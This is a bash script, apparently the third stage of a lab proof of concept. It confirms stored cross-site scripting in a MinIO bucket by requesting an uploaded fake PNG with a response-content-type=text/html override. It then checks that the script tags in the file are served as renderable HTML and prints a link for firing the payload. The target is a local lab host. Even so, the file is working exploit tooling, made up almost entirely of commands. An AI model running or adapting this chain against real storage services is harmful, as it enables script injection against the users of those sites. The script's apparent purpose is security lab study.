#!/usr/bin/env bash
# Stage 3: confirmation. The override is applied, the bytes we uploaded as a
# "PNG" are now delivered as text/html, and the script tag is inside the body
# the browser will render. Same-origin stored XSS on whatever host serves the
# bucket (in this lab: 127.0.0.1:9000).
set -euo pipefail

BASE="${MINIO_URL:-http://127.0.0.1:9000}"
KEY="${1:-public/avatar-payload.png}"
URL="${BASE}/${KEY}?response-content-type=text/html"

echo "GET ${URL}"
ct=$(curl -sS -D - -o /tmp/lab-body.html "${URL}" | grep -i '^content-type' | tail -n 1 | tr -d '\r')
echo "served as: ${ct}"

echo
echo "--- <script> payloads delivered in the body ---"
grep -a -o '<script>[^<]*</script>' /tmp/lab-body.html

if echo "$ct" | grep -qi 'text/html' && grep -a -q '<script>' /tmp/lab-body.html; then
  echo
  echo "[+] Stored XSS confirmed: attacker-controlled bytes served as text/html."
  echo "    Open in a browser to fire the alert:"
  echo "    ${URL}"
else
  echo
  echo "[-] Not exploitable: either the override did not apply or no script in body."
  exit 1
fi
